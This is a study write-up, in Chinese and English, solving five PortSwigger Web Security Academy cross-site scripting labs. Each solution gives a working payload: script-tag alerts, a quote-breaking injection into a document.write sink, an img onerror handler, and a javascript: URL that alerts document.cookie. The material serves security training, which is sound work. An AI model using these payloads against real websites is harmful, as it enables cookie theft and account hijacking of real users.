# Cross-site scripting

## [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

### 題目解釋
在搜尋功能的反射性 XSS

### 解答
在搜尋上面打

```
<script>alert(1)</script>
```

## [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 
### 題目解釋
儲存型 XSS 在留言區

### 解答
在留言的 Comment 上面打

```
<script>alert(1)</script>
```

## [Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋

### 解答
觀察原始碼可以發現

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

這邊有一個 tracking，會塞到 img src 裡面，所以我可以先用 `">` 把它閉合再 XSS

在搜尋輸入
```
"> <script>alert(1)</script>
```


## [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋
題目說是 DOM-based 在 innderHTML 裡面

### 解答
搜尋列寫
```html
<img src='' onerror="alert(1)">
```


## [Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 
### 題目解釋
### 解答
先隨便點到一篇文底下，例如

```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/post?postId=1
```

觀察 `Submit feedback` 的連結會變成 `https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=/post`

```javascript=
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

我們知道在 href 裡面塞 `javascript:alert(1)` 可以 alert

所以
```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

然後按下 Back 就可以噴出餅乾了


